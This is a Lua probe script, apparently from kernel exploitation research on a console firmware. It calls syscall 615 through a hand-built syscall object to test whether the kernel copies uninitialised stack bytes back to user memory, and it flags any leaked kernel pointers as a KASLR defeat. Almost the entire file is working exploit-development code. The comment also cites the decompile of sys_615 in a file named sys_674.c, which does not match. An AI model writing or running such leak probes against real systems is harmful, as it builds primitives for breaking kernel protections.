-- CRASH_CLASS: HIGH
-- PROBE 1062a: does syscall 615 copy uninitialised kernel stack to user memory?
--
-- Context: in the 13.60 decompile of sys_615
-- (results/kernel_handlers/decompiled/sys_674.c:736-760) the handler copies 8 bytes out of a
-- kernel stack buffer that nothing writes:
--
--   iVar3 = sub_abccc0(param_1, *param_2, local_d8);        -- uap[0] selects an object
--   if (iVar3 == 0) {
--     copyout(local_d8, *(u64 *)(param_2 + 2), 8);          -- uap[1] = destination
--     if (ok) copyout(local_d0, *(u64 *)(param_2 + 4), 8);  -- uap[2] = destination
--   }
--
-- `local_d8` is filled by sub_abccc0; `local_d0` is declared and never written anywhere in the
-- body. If that reading is right, the second copyout hands the caller 8 bytes of whatever was
-- on that kernel stack frame before the call: return addresses, saved registers, heap pointers.
-- One such qword is a KASLR defeat, and unlike the page-presence oracle it would be contents.
--
-- This probe measures it: for a small set of uap[0] candidates, call 615 with two distinct user
-- destinations and print both results. A -1 means the object lookup refused that argument.

print("=== PROBE 1062a: syscall 615 uninitialised stack copyout ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function as_addr(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function fill(a, v)
    pcall(function() memory.write_qword(uint64(a), uint64(v)) end)
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_qword(uint64(a)) end)
    if ok and v then return to_num(v) end
    return nil
end
local function hex(v)
    if v == nil then return "nil" end
    return string.format("%X", v)
end
-- kernel pointers live at 0xFFFF8xxx_xxxxxxxx and above; 0xFFFFFFFF_* sentinels are not pointers
local function is_kaddr(v)
    if v == nil then return false end
    local hi = math.floor(v / 0x100000000)
    return hi >= 0xFFFF8000 and hi < 0xFFFFFFF0
end

local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc_615 = mk(615)
local sc_getpid = mk(20)

local dstA = memory.alloc(0x20)
local dstB = memory.alloc(0x20)
local aA, aB = as_addr(dstA), as_addr(dstB)
if aA == 0 or aB == 0 then print("[!] setup failed"); return end

local pid_ok, pidv = pcall(function() return sc_getpid() end)
local pid = pid_ok and to_num(pidv) or 0
print(string.format("[0] pid=%d dstA=%X dstB=%X", pid, aA, aB))

local cands = { 0, 1, 2, 3, 4, 5, 0x10, 0x100, pid, 22, 23 }
local hits, calls = 0, 0

for i = 1, #cands do
    local sel = cands[i]
    fill(aA, 0xCDCDCDCDCDCDCDCD)
    fill(aB, 0xCDCDCDCDCDCDCDCD)
    local ok, rv = pcall(function()
        return sc_615(uint64(sel), uint64(aA), uint64(aB), uint64(0), uint64(0), uint64(0))
    end)
    calls = calls + 1
    if not ok then
        print(string.format("[%d] sel=%d threw", i, sel))
    else
        local r = to_num(rv)
        local va, vb = rd(aA), rd(aB)
        local ka = is_kaddr(va) or is_kaddr(vb)
        if ka then hits = hits + 1 end
        print(string.format("[%d] sel=%d rv=%d A=%s B=%s %s", i, sel, r,
            hex(va), hex(vb), ka and "<KERNEL-ADDR>" or ""))
    end
end

print(string.format("[R] calls=%d kaddr=%d", calls, hits))
local x, y
x, y = rd(aA), rd(aB)
print(string.format("[Z] last A=%s B=%s alive pid=%d", hex(x), hex(y), to_num(select(2, pcall(sc_getpid)))))
print("=== COMPLETE ===")
